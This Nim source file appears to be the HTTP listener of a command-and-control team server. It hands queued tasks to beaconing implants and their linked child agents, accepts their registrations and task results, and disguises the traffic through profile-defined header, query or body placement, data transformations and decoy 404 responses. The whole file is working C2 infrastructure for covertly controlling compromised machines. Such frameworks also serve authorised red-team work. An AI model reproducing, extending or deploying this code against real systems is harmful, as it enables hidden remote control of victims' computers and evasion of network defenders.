import mummy, terminal
import strutils, strformat, tables

import ./handlers
import ../globals
import ../core/[logger, websocket]
import ../../common/[utils, serialize, profile]
import ../../types/[common, server]

# Not Found
proc error404*(request: Request) =  
    request.respond(404, body = "")

# Method not allowed 
proc error405*(request: Request) = 
    request.respond(405, body = "") 

# Utils 
proc hasKey(headers: seq[(string, string)], headerName: string): bool =
    for (name, value) in headers:
        if name.toLower() == headerName.toLower():
            return true
    return false

proc get(headers: seq[(string, string)], headerName: string): string =
    for (name, value) in headers:
        if name.toLower() == headerName.toLower():
            return value
    return ""

#[
    GET
    Called from agent to check for new tasks
]#
proc httpGet*(request: Request) = 
    {.cast(gcsafe).}:

        # Check heartbeat metadata placement
        var heartbeatString: string

        case cq.profile.getString("http-get.agent.heartbeat.placement.type"): 
        of "header": 
            let heartbeatHeader = cq.profile.getString("http-get.agent.heartbeat.placement.name")
            if not request.headers.hasKey(heartbeatHeader): 
                request.respond(404, body = "")
                return
            heartbeatString = request.headers.get(heartbeatHeader)

        of "query": 
            let param = cq.profile.getString("http-get.agent.heartbeat.placement.name")
            heartbeatString = request.queryParams.get(param)  
            if heartbeatString.len <= 0: 
                request.respond(404, body = "")
                return

        of "body": 
            heartbeatString = request.body 

        else: discard 

        # Reverse data transformation to get raw heartbeat packet
        let heartbeat = cq.profile.reverseDataTransformation("http-get.agent.heartbeat", heartbeatString)

        try: 
            var responseBytes: seq[byte]
            let tasks = getTasks(heartbeat)

            if tasks.len <= 0: 
                request.respond(200, body = "")
                return

            # Return tasks for agent and linked children
            for agentId, tasks in tasks: 
                responseBytes.add(uint32.toBytes(string.toUuid(agentId)))           # 4 bytes agent ID
                responseBytes.add(cast[uint8](tasks.len()))                         # 1 byte number of tasks for agent

                for task in tasks:
                    responseBytes.add(uint32.toBytes(uint32(task.len)))             # 4 bytes length of task 
                    responseBytes.add(task)                                         # variable length task
                
                # Notify operator that agent collected tasks
                cq.sendConsoleItem(agentId, LOG_INFO, fmt"{$responseBytes.len} bytes sent.") # Always send this message (even when silent/browser tasks are collected)
                cq.info(fmt"{$responseBytes.len} bytes sent.")
            
            # Apply data transformation to the response
            let payload = cq.profile.applyDataTransformation("http-get.server.output", responseBytes)

            # Add headers, as defined in the team server profile 
            var headers: HttpHeaders
            for header in cq.profile.getTableKeys("http-get.server.headers"):
                headers.add((header.key, header.value.getStringValue()))

            request.respond(200, headers = headers, body = payload)

        except CatchableError as err:
            cq.error(err.msg)
            request.respond(404, body = "")

#[
    POST 
    Called from agent to register itself or post results of a task
]#
proc httpPost*(request: Request) = 
    {.cast(gcsafe).}:

        try:        
            # Retrieve data from the request
            var dataString: string
            
            case cq.profile.getString("http-post.agent.output.placement.type"): 
            of "header": 
                let dataHeader = cq.profile.getString("http-post.agent.output.placement.name")
                if not request.headers.hasKey(dataHeader): 
                    request.respond(400, body = "")
                    return
                dataString = request.headers.get(dataHeader)

            of "query": 
                let param = cq.profile.getString("http-post.agent.output.placement.name")
                dataString = request.queryParams.get(param)  
                if dataString.len <= 0: 
                    request.respond(400, body = "")
                    return

            of "body": 
                dataString = request.body

            else: discard 

            # Reverse data transformation
            let data = cq.profile.reverseDataTransformation("http-post.agent.output", dataString)

            # Add response headers, as defined in team server profile
            var headers: HttpHeaders
            for header in cq.profile.getTableKeys("http-post.server.headers"):
                headers.add((header.key, header.value.getStringValue()))

            # Differentiate between registration and task result packet
            var unpacker = Unpacker.init(Bytes.toString(data))
            let packetCount = unpacker.getUint8()
            
            for i in 0 ..< int(packetCount): 
                let data = unpacker.getDataWithLengthPrefix()
                let dataUnpacker = Unpacker.init(data)
                let header = dataUnpacker.deserializeHeader()

                if cast[PacketType](header.packetType) == MSG_REGISTER: 
                    if not register(string.toBytes(data), request.remoteAddress):
                        request.respond(400, body = "")
                        return

                elif cast[PacketType](header.packetType) == MSG_RESULT: 
                    handleResult(string.toBytes(data))
                
            request.respond(200, body = cq.profile.getString("http-post.server.output.body"))

        except CatchableError:
            request.respond(404, body = "")

        return